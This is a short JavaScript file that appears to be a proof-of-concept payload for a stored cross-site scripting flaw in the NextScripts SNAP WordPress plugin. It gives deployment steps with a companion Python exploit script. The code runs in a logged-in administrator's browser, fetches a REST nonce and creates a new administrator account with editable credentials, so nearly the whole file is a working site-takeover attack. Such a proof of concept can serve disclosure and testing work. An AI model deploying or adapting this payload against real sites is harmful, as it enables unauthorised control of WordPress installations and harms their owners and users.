// ============================================================
// x.js - Payload for NextScripts SNAP stored XSS -> Admin takeover
// Deploy: host this file at any URL, then:
//   python poc_stored_xss_avatar.py --url <TARGET_POST_URL> \
//       --create-admin u:p --js-url https://YOUR-SERVER/x.js
//
// When an ADMIN (logged in) opens the page, the injected
// <img onerror=...> loads this script in the admin's session,
// which creates a new administrator via the WP REST API.
// ============================================================
(async () => {
  // WP REST root is advertised in the page head:
  //   <link rel="https://api.w.org/" href="http://HOST/wp/wp-json/" />
  const base = document.querySelector('link[rel="https://api.w.org/"]').href;

  // Get a REST nonce for the logged-in (admin) session.
  const nonceUrl = base.replace('wp-json/', 'wp-admin/admin-ajax.php?action=rest-nonce');
  const n = await (await fetch(nonceUrl)).text();

  // >>> EDIT THESE: new admin account credentials <<<
  const username = 'poc-admin';
  const password = 'poc-admin';
  const email    = 'poc-admin@example.com';

  const body = new URLSearchParams({
    username: username,
    password: password,
    email: email,
    'roles[0]': 'administrator',
  });

  await fetch(base + 'wp/v2/users', {
    method: 'POST',
    headers: { 'X-WP-Nonce': n },
    body: body,
  });
})();
